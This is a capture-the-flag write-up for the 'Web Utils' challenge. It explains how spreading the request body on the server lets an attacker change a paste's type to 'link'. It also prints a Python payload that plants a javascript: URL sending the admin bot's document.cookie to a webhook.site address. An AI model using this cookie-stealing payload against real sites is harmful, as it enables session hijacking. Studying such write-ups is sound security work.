# Web Utils
### Made by: BrownieInMotion, Jim

Challenge text:
```
My friend made this dumb tool; can you try and steal his cookies? If you send me a link, I can pass it along.
```
We were also given the zipped folder [app](app).

The website was a combination of a URL "shortener" and a Pastebin. You could create both links and pastes, but links had to start with `http(s)://`. After creating either you got a URL that looked something like this `https://web-utils.dicec.tf/view/y00cs353`. It used the `/view/` endpoint for both links and pastes, which is a bit odd. Your data was loaded using this JS:
```js
(async () => {
    const id = window.location.pathname.split('/')[2];
    if (! id) window.location = window.origin;
    const res = await fetch(`${window.origin}/api/data/${id}`);
    const { data, type } = await res.json();
    if (! data || ! type ) window.location = window.origin;
    if (type === 'link') return window.location = data;
    if (document.readyState !== "complete")
    await new Promise((r) => { window.addEventListener('load', r); });
    document.title = 'Paste';
    document.querySelector('div').textContent = data;
})()
```
It basically gets the last part of the URL, and asks the API for the data associated with it. The API doen't do anything special, it simply returns the `data` and `type`. If the type is a link, it changes the window.location to the data, otherwise it displays the paste data by changing the `textContent`. When you change `textContent`, the browser does no parsing, which means you can't inject scripts in a paste no matter how hard you try. Because of this along with the fact that both pastes and links shared the same endpoint I assumed my goal was to create a `javascript:` link. The problem was that links *had* to start with `http(s)://`, and `https://javascript:alert(1);` doesn't work. There also wasn't a way to create a paste with a link type, as this was done server-side.

A normal request payload when you create a paste is JSON formatted and looks like this: `{"data":"Paste content!"}`. However on the server we see that it calls the `database.addData` with an object as an argument with the type set to "paste", our request content and the id. The anomaly here is that instead of inputting `req.body.data`, it uses the JS [spread operator](https://oprea.rocks/blog/what-do-the-three-dots-mean-in-javascript/) on the entire `req.body`. We can recreate that in our own file.
```js
const uid = 'randUID1'

let reqbody = {
    data: "Paste content!"
}

let db_obj = { type: 'paste', ...reqbody, uid }

console.log(db_obj);
```
The output of this is: `{ type: 'paste', data: 'Paste content!', uid: 'randUID1' }`

However, due to the nature of how spread works, we can overwrite the type by changing the reqbody. If we change reqbody to
```
{
    data: "Paste content!",
    type: "link"
}
```
The output will be `{ type: 'link', data: 'Paste content!', uid: 'randUID1' }`. This allows us to create links that don't start with `http(s)://`. Knowing this we can create a `javascript:` link.

```py
import json
import requests

payload = {
    "data": "javascript:window.location='https://webhook.site/c0b95a39-1d3f-4636-bcdb-6816c1908c05?c=%27+document.cookie",
    "type": "link"
}

print(requests.post('https://web-utils.dicec.tf/api/createPaste', data=json.dumps(payload), headers={'content-type': 'application/json'}).text)
```
Response: `{"statusCode":200,"data":"2d5yEcsR"}`

We then send the admin bot the link to our paste, and we see their cookie which is the flag `dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}`.